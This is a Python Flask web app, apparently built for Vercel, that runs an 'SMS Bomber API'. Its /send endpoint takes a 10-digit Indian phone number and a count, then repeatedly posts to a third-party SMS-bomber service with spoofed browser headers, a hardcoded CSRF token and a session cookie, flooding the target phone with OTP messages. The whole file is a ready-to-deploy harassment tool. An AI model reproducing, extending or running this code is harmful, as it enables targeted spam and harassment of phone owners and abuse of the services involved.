from flask import Flask, request, jsonify
import requests
import json
import time

app = Flask(__name__)

def send_otp_bomber(phone_number, total_otps):
    url = "https://greatonlinetools.com/smsbomber/endpoints/api/receive_number.php"
    sent_count = 0
    failed_count = 0
    results = []

    for current_count in range(1, total_otps + 1):
        payload = {
            "mobile": phone_number,
            "count": total_otps,
            "country_code": "91",
            "curr_count": current_count,
            "csrf_token": "d1a98ebd3fa1cbc6fab5f65bc22e7689b0e0541d3e116d7d2e2af7d0b37fd8db",
            "request_type": "sms_bomber"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 15; 23076RN4BI Build/AQ3A.240912.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7559.132 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'x-requested-with': "XMLHttpRequest",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Android WebView\";v=\"144\"",
            'sec-ch-ua-mobile': "?1",
            'origin': "https://greatonlinetools.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://greatonlinetools.com/smsbomber/",
            'accept-language': "en-IN,en-US;q=0.9,en;q=0.8",
            'priority': "u=1, i",
            'Cookie': "PHPSESSID=c0c366f9bda0530a31bf9ca85ec012b3"
        }
        try:
            response = requests.post(url, data=json.dumps(payload), headers=headers)
            if response.status_code == 200:
                sent_count += 1
                results.append({"attempt": current_count, "status": "success"})
            else:
                failed_count += 1
                results.append({"attempt": current_count, "status": "failed", "code": response.status_code})
        except Exception as e:
            failed_count += 1
            results.append({"attempt": current_count, "status": "error", "error": str(e)})

        if current_count < total_otps:
            time.sleep(2)  # still a delay, may cause timeout

    return {
        "total_requested": total_otps,
        "success": sent_count,
        "failed": failed_count,
        "details": results
    }

@app.route('/send', methods=['GET', 'POST'])
def send():
    # Accept parameters via query string (GET) or JSON body (POST)
    if request.method == 'GET':
        phone = request.args.get('phone')
        count = request.args.get('count', default=5, type=int)
    else:
        data = request.get_json()
        phone = data.get('phone')
        count = data.get('count', 5)

    if not phone or not phone.isdigit() or len(phone) != 10:
        return jsonify({"error": "Valid 10-digit phone number required"}), 400
    if count < 1 or count > 20:
        return jsonify({"error": "Count must be between 1 and 20"}), 400

    # Run the bomber (synchronously – may time out on Vercel!)
    result = send_otp_bomber(phone, count)
    return jsonify(result)

@app.route('/')
def index():
    return jsonify({
        "message": "SMS Bomber API",
        "usage": "GET /send?phone=XXXXXXXXXX&count=5  or POST JSON to /send"
    })

# Vercel looks for a variable named 'app' by default
